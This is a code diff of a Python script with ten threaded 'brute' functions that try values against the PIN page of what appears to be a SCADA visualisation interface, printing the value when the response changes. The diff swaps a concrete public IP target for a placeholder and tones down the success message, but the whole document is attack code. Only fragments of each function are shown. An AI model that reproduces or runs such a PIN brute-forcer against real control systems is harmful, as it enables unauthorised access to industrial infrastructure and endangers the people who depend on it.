@@ -2,7 +2,7 @@ import requests
 import urllib.request
 import threading
 
-target = "http://62.163.74.206/scada-vis/pin?return=touch"
+target = "http://IP/scada-vis/pin?return=touch"
 
 
 
@@ -17,7 +17,7 @@ def brute1():
 			if response.text == x:
 				pass
 			else:
-				print(i +'YEEEEEEEEEEEEEEEEES')
+				print(i +'YES')
 				exit()
 		except:
 			pass
@@ -29,7 +29,7 @@ def brute2():
 			if response.text == x:
 				pass
 			else:
-				print(i +'YEEEEEEEEEEEEEEEEES')
+				print(i +'YES')
 				exit()
 		except:
 			pass
@@ -41,7 +41,7 @@ def brute3():
 			if response.text == x:
 				pass
 			else:
-				print(i +'YEEEEEEEEEEEEEEEEES')
+				print(i +'YES')
 				exit()
 		except:
 			pass
@@ -53,7 +53,7 @@ def brute4():
 			if response.text == x:
 				pass
 			else:
-				print(i +'YEEEEEEEEEEEEEEEEES')
+				print(i +'YES')
 				exit()
 		except:
 			pass
@@ -65,7 +65,7 @@ def brute5():
 			if response.text == x:
 				pass
 			else:
-				print(i +'YEEEEEEEEEEEEEEEEES')
+				print(i +'YES')
 				exit()
 		except:
 			pass
@@ -77,7 +77,7 @@ def brute6():
 			if response.text == x:
 				pass
 			else:
-				print(i +'YEEEEEEEEEEEEEEEEES')
+				print(i +'YES')
 				exit()
 		except:
 			pass
@@ -89,7 +89,7 @@ def brute7():
 			if response.text == x:
 				pass
 			else:
-				print(i +'YEEEEEEEEEEEEEEEEES')
+				print(i +'YES')
 				exit()
 		except:
 			pass
@@ -101,7 +101,7 @@ def brute8():
 			if response.text == x:
 				pass
 			else:
-				print(i +'YEEEEEEEEEEEEEEEEES')
+				print(i +'YES')
 				exit()
 		except:
 			pass
@@ -113,7 +113,7 @@ def brute9():
 			if response.text == x:
 				pass
 			else:
-				print(i +'YEEEEEEEEEEEEEEEEES')
+				print(i +'YES')
 				exit()
 		except:
 			pass
@@ -125,7 +125,7 @@ def brute10():
 			if response.text == x:
 				pass
 			else:
-				print(i + 'YEEEEEEEEEEEEEEEEES')
+				print(i + 'YES')
 				exit()
 		except:
 			pass
